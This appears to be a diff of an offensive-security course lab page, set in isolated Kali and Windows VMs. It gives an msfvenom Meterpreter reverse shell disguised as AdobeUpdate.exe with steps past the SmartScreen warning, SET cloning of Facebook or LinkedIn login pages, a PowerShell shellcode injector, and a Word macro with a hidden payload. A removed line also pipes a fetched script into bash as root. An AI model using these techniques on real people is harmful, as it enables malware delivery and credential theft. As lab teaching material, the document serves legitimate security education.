@@ -23,13 +23,20 @@ to create the payloads, and you are on your own to trick the user.
 
 # Part 1. MSFVenom with fake AdobeUpdate.exe
 
-In this section, you’ll use `msfvenom` to perform a client-side attack.
-Your goal is to (1) create a malicious executable file and (2) host it on a web server.
-Following this, you will play the role of the victim using the Windows VM, and
-you will (3) download and (4) run the payload, leading to the Windows VM being
-exploited.
+In this section, you’ll use `msfvenom` to perform a client-side attack.  Your
+goal is to:
 
-1.    Log in to Kali. Start up the Windows virtual machine.
+1. Create a malicious executable file containing a payload
+2. Host it on a web server disguised as an Adobe Update file.
+
+Following this, you will play the role of the victim using the Windows
+VM. You will:
+
+1. Download the malicious file
+2. Run the file, leading to the Windows VM being exploited.
+
+
+To start, log in to Kali, and start up the Windows virtual machine.
 
 ## Play the attacker
 
@@ -38,7 +45,9 @@ exploited.
       We’ll use `exe` option (via `-f exe`) option to create a Windows executable.
 5.    In Kali, run the following command, all on one line:
 
-          msfvenom -p windows/meterpreter/reverse_tcp LHOST=virbr1 -f exe > /tmp/AdobeUpdate.exe
+      ```bash
+      msfvenom -p windows/meterpreter/reverse_tcp LHOST=virbr1 -f exe > /tmp/AdobeUpdate.exe
+      ```
 
       Where:
 
@@ -76,22 +85,35 @@ exploited.
       The handler is now listening.
 
 7.    Now, we need to set up a way to deliver the payload to the victim.
-      Set up a web server to host your malicious file.
+      We will set up a web server to host your malicious file.
 
-      8.  Change directories to `/tmp` by entering `cd /tmp` in a kali terminal.
-      8.  Check that the payload you generated earlier is in this directory: run `ls`
+      8.  From a terminal on Kali, change directories to `/tmp`:
+
+          ```bash
+          cd /tmp
+          ```
+      8.  Use `ls` to check that the payload you generated earlier is in this directory.
       9.  Now, from that directory, run the following command to use an http
           webserver built into `python` to serve content from the current directory (`/tmp`)
           on an arbitrary port - `8888`:
 
-              python3 -m http.server 8888
+          ```bash
+          python3 -m http.server 8888
+          ```
+
+          **Note:** when you run this command, it will appear that nothing
+          happens.  Actually, the web server is running, and it will log output
+          to the terminal if it receives any web requests. You can verify this
+          by visiting <http://localhost:8888> in a web browser on Kali and
+          observing the output logged to the terminal.
 
 ## Play the victim
 
 16.  Now, switch to playing the role of the victim. On your Windows VM, using
-     Chrome, navigate to `http://192.168.56.101:8888`. Click `AdobeUpdate.exe` to
-     download it. Click it to execute it. On the "Windows protected your PC"
-     security dialog that appears, click "More info" and then "Run anyway."
+     the Internet Explorer web browser (Not Chrome!), navigate to
+     `http://192.168.56.101:8888`. Click `AdobeUpdate.exe` to download it. Click
+     it to execute it. On the "Windows protected your PC" security dialog that
+     appears, click "More info" and then "Run anyway."
 
      {% include lab-image.html image='adobe-update-execute-more-info.png' %}
 
@@ -174,9 +196,10 @@ In this section, you’ll use the Social Engineering Toolkit (SET) to craft soci
      the IP address of Kali Linux for the host-only network. If SET already displays the correct IP address
      in brackets (e.g., "[192.168.56.101]"), just push enter.
 
-     Now you get to choose the website to clone. However, not all websites' login processes can be automatically cloned.
-     One login page that was verified to work as of November 2020 is `https://twitter.com` -- set this address as the one
-     to clone.
+     Now you get to choose the website to clone. However, not all websites'
+     login processes can be automatically cloned.  Two login pages that were
+     verified to work as of October 2021 are `https://www.facebook.com` and
+     `https://linkedin.com`. Set either of these as the address to clone.
 
      **Note:** Be sure you enter "https" in the URL.
 
@@ -199,7 +222,7 @@ In this section, you’ll use the Social Engineering Toolkit (SET) to craft soci
 
      You should be looking at whatever the current Twitter.com login page looks like -- a cloned copy!
 
-     {% include lab-image.html image='twitter-login.png' %}
+     {% include lab-image.html image='facebook-login.png' %}
 
      **Note:** the address bar indicates the actual IP of the attacker. This is the biggest indication
      that the site is forged. If this were a more sophisticated attempt, the attacker would obtain a
@@ -240,6 +263,8 @@ From the SET main menu:
 
 
 # Part 3. Social Engineering Toolkit (SET) -- PowerShell Shellcode Injector
+
+<div class='alert alert-danger'><strong>Closed for maintenance!</strong> For unknown reasons, this exploit it not currently working (last tried October 2021). Skip this part.</div>
 
 PowerShell is a powerful scripting language built into the Windows operating system. In this section, you will generate an encoded PowerShell script and
 execute it on Windows which opens a Meterpreter session on attacker’s machine.
@@ -284,11 +309,20 @@ Take a screenshot showing the output of running the following commands from your
     echo "your first and last name"
     date /t
 
+
 # Part 4. Create a Malicious Microsoft Word Document
 
-In this section, you will create a macro-enabled Microsoft Word file that opens a Meterpreter session on an attacker’s machine.
-Note that this exploits a _feature_ of Word -- not an inherent security vulnerability per se. For this reason, this attack
-vector will work as long as you can convince a user to open the Word file and enable some settings.
+In this section, you will create a macro-enabled Microsoft Word file that opens
+a Meterpreter session on an attacker’s machine.  Note that this exploits a
+_feature_ of Word -- not an inherent security vulnerability per se. Microsoft
+explains macros in Word as follows:
+
+> In Word, you can automate frequently used tasks by creating and running
+> macros. A macro is a series of commands and instructions that you group
+> together as a single command to accomplish a task automatically.
+
+Because Word docs can run macros, this attack vector will work as long as you
+can convince a user to open the Word file and enable some settings.
 
 The first step is to create the malicious macro-embedded Word document, acting as the attacker.
 You will need access to Microsoft Word in order
@@ -329,7 +363,7 @@ portion of this lab.
 4.   Install Word into the Windows virtual machine.
 
      The version of Word that gets installed on the lab virtual machine only works for 5 days without a product key.
-     The first time that you install windows to your virtual machine, you can run the following from kali as root:
+     The first time that you install windows to your virtual machine, you can run the following from kali as `root`:
 
          cd /root/vagrant-boxes/lab-windows-2019-vuln/
          git pull
@@ -338,12 +372,35 @@ portion of this lab.
 
      The installation process takes about two minutes.
 
-     If your activation grade period expires and you still need access to Word on your Windows VM, you can get a fresh start
-     by running the full vagrant destroy-up-provision cycle again, via running the following script **as root**:
 
-         wget -O - https://raw.githubusercontent.com/deargle/kali-xfce-gcp-qemu-packer/master/kali-pentest-lab/update-server2019.sh | bash
+     <div class='alert alert-info'><strong>If your Word install expires </strong>
+     <p>If your Word activation grade period expires, you can get a fresh start
+     by running the full vagrant destroy-up-provision cycle again, via running
+     the following from a terminal as `root`</p>
 
-1.   When the script finishes, open Word on Windows. On the screen `Sign in to set up Office`, click `I don't want to sign in or create an account`. Exit the Window requesting an Office product key.
+     <div markdown="1">
+     ```bash
+     cd /root/vagrant-boxes/lab-windows-2019-vuln
+     vagrant destroy
+     vagrant up
+     vagrant provision --provision-with install-word
+     vagrant provision --provision-with reboot
+     ```
+     </div>
+
+
+1.   When the script finishes, open Word on Windows. Navigate through the welcome prompts.
+
+     * On the screen `Sign in to set up Office`, click the `x` in the upper-right corner.
+     * On the privacy page, click "Next"
+     * On the next page, select "Don't send optional data"
+     * On the next page, click "Done".
+1.   Open a new blank document:
+
+     {% include lab-image.html image='word-open-blank-document.png'%}
+3.   "Save" the word document as a macro-enabled document (`.docm`):
+
+     {% include lab-image.html image='word-save-as.png' %}
 
 1.   Enable the Developer tool access button on the Word ribbon:
 
@@ -372,10 +429,8 @@ portion of this lab.
 
     {% include lab-image.html image='word-macro-exploit-example-exe.png' %}
 
-    "Save" the VB module, selecting a Word macro-enabled document (`.docm`). Close the VB editor.
 
-    {% include lab-image.html image='word-macro-exploit-save-as.png' %}
-
+1.  "Save" the VB Module. Close the VB editor.
 5.  Next, in the main body of the Word document, paste the payload hex code from the kali output textfile. Save the document again.
 
     {% include lab-image.html image='word-macro-exploit-copy-payload.png' %}
@@ -388,11 +443,13 @@ portion of this lab.
 
     This will make the hex code difficult to find for anyone who opens the document.
 
-6.  Test your malicious Word file by opening it on the Windows VM. If Word asks,
-    `enable macro content` (look for a yellow bar on the top
-    of the Word document window).
+6.  Next, test your malicious Word file.
 
-    {% include lab-image.html image='word-macro-exploit-enable-content.png' %}
+    1. Close the document. Then, open it again.
+    1. If Word asks, `enable macro content` (look for a yellow bar on the top of
+       the Word document window).
+
+       {% include lab-image.html image='word-macro-exploit-enable-content.png' %}
 
     In the Kali VM, you should now see that a Meterpreter session has been opened to the host workstation. Press the `enter`/`return` key to get a new line of `msfconsole` input.
 
@@ -409,7 +466,7 @@ portion of this lab.
 
 In your meterpreter session on the Windows VM, take a screenshot showing the output of running the following commands:
 
-    ps -S <first few letters of your gibberish.txt>
+    ps -S <first-few-letters-of-your-gibberish-exe-filename>
     getpid
     shell
     echo "your first and last name"
